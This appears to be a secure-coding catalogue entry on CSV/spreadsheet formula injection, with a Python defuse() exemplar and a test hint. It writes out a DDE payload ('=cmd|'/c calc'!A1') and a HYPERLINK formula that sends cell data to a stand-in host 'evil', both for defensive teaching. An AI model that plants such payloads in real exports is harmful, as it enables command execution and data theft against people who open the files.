name: CSV / Spreadsheet Formula Injection
attack_scenario: Attacker sets a profile field to =cmd|'/c calc'!A1 (or =HYPERLINK("//evil/"&A1&A2)); it is exported verbatim into the CSV, and when an admin opens the report Excel fires the DDE payload or silently posts other cells to the attacker's server.
negative_test_hint: export a user whose name field is "=cmd|'/c calc'!A1" into the CSV and assert the cell is prefixed with a quote or the value is rejected

exemplar.compliant:
def defuse(c):
    c = str(c)
    return "'" + c if c[:1] in ("=", "+", "-", "@", "\t", "\r") else c
w = csv.writer(resp)
w.writerow([defuse(v) for v in row])
exemplar.explanation: A cell beginning with =, +, -, @ (or a tab/CR before them) is evaluated as a formula when the exported CSV/XLSX is opened in Excel or LibreOffice, enabling DDE command execution or silent data exfiltration via HYPERLINK/WEBSERVICE. Prefixing such cells with a quote, or rejecting them before serialization, neutralizes the formula while preserving the visible value.
